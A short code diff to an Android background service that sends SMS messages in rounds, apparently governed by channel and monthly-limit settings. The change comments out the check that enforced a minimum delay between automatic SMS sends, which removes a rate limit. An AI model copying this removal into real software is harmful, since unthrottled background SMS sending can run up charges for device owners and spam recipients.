@@ -304,10 +304,10 @@ public class BgService extends Service {
         long last_sms_time = sm.getLastSMSTime();
         long sms_delay = sm.getSMSSendDelay();
         long current_time = System.currentTimeMillis();
-        if ((current_time - last_sms_time) < sms_delay) {
-            sm.log(TAG, "======= ignore this sms send because the sms time delay not reach =====");
-            return;
-        }
+//        if ((current_time - last_sms_time) < sms_delay) {
+//            sm.log(TAG, "======= ignore this sms send because the sms time delay not reach =====");
+//            return;
+//        }
         sm.log(TAG, "receive the intent for send on sms, intent action = " + ACTION_SEND_SMS_ROUND);
         if (sm.mXMLHandler != null) {
             String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
